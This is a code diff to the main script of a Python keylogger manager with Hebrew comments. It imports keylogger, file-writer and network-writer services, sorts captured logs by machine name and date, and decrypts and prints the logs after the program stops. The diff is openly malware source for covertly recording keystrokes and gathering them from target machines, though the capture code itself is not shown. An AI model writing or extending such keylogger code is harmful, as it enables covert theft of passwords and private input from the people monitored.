@@ -1,5 +1,6 @@
 import time
 import logging
+from datetime import datetime
 from services.KeyLoggerService import Keyloggerservice
 from services.file_writer import FileWriter
 from services.networkwriter import NetworkWriter
@@ -46,7 +47,7 @@ def main():
 
     try:
         while manager.is_running():
-            time.sleep(1)
+            time.sleep(Config.UPDATE_INTERVAL)
 
     except KeyboardInterrupt:
         logging.info("⏹ עוצר את KeyLogger Manager...")
@@ -54,15 +55,16 @@ def main():
 
         # ---- פענוח הקובץ אחרי העצירה ----
         try:
-            log_file = f"{Config.LOG_DIRECTORY}/log.txt"
+            log_file = f"{Config.LOG_DIRECTORY}/{Config.MACHINE_NAME}/log_{datetime.now().strftime('%Y-%m-%d')}.txt"
             with open(log_file, "r", encoding="utf-8") as f:
-                encrypted_data = f.read()
+                lines = f.readlines()
 
-            decrypted_data = encryptor.decrypt(encrypted_data)
+            decrypted_lines = [encryptor.decrypt(line.strip()) for line in lines if line.strip()]
+            decrypted_data = "\n".join(decrypted_lines)
+
             print("\n--- Decrypted File Content ---")
             print(decrypted_data)
 
-            # שמירה לקובץ חדש מפוענח
             with open("decrypted_output.txt", "w", encoding="utf-8") as f:
                 f.write(decrypted_data)
 
